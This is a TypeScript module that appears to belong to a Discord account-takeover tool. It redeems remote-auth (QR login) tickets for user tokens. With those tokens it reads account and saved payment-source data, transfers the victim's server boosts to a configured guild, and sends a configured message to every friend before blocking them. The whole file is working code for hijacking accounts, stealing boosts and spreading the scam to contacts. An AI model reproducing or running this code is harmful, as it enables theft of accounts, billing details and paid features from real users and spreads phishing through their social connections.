import fetch from "node-fetch";
import { config } from "../../util/config";
import { IBoost, IChannel, IFriend, IUser } from "../../types/discord";
import { ITicketData } from "../../types";

export const remoteAuthTicket = async (
  ticket: string,
  captcha_key?: string,
  captcha_token?: string
): Promise<ITicketData> => {
  console.log(
    JSON.stringify({
      ticket,
      captcha_key: captcha_key?.substring(0, 10),
      captcha_rqtoken: captcha_token,
    })
  );

  return captcha_key
    ? await (
        await fetch(`https://discord.com/api/v9/users/@me/remote-auth/login`, {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Content-Type": "application/json",
          },
          method: "POST",
          body: JSON.stringify({
            ticket,
            captcha_key: captcha_key,
            captcha_rqtoken: captcha_token,
          }),
        })
      ).json()
    : await (
        await fetch(`https://discord.com/api/v9/users/@me/remote-auth/login`, {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Content-Type": "application/json",
          },
          method: "POST",
          body: JSON.stringify({
            ticket,
          }),
        })
      ).json();
};

export const getUserInformation = async (token: string): Promise<IUser> => {
  return await (
    await fetch(`https://discord.com/api/users/@me`, {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        Authorization: token,
      },
    })
  ).json();
};

export const getBillingInformation = async (token: string) => {
  return await (
    await fetch(
      `https://discord.com/api/v9/users/@me/billing/payment-sources`,
      {
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
          Authorization: token,
        },
      }
    )
  ).json();
};

export const getAllBoosts = async (token: string): Promise<IBoost[]> => {
  return await (
    await fetch(
      `https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots`,
      {
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
          Authorization: token,
        },
      }
    )
  ).json();
};

export const addBoostToserver = async (
  token: string,
  discordBoosts: Array<string>
) => {
  return await (
    await fetch(
      `https://discord.com/api/v9/guilds/${config.verify.guildId}/premium/subscriptions`,
      {
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
          "Content-Type": "application/json",
          Authorization: token,
        },
        method: "PUT",
        body: JSON.stringify({
          user_premium_guild_subscription_slot_ids: discordBoosts,
        }),
      }
    )
  ).json();
};

export const getAllFriends = async (token: string): Promise<IFriend[]> => {
  return await (
    await fetch(`https://discord.com/api/users/@me/relationships`, {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        Authorization: token,
      },
    })
  ).json();
};

export const createFriendChannel = async (
  token: string,
  friendId: string
): Promise<IChannel> => {
  return await (
    await fetch(`https://discord.com/api/v9/users/@me/channels`, {
      method: "POST",
      body: JSON.stringify({
        recipients: [friendId],
      }),
      headers: {
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        Authorization: token,
      },
    })
  ).json();
};

export const sendMessage = async (token: string, channelId: string) => {
  return await (
    await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
      method: "POST",
      body: JSON.stringify({
        content: config.autoMessage.text,
        nonce: "",
        tts: false,
      }),
      headers: {
        Authorization: token,
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      },
    })
  ).json();
};

export const blockFriend = async (token: string, friendId: string) => {
  return await fetch(
    `https://discord.com/api/v9/users/@me/relationships/${friendId}`,
    {
      method: "PUT",
      body: JSON.stringify({
        type: 2,
      }),
      headers: {
        Authorization: token,
        "Content-type": "application/json; charset=UTF-8",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
      },
    }
  );
};
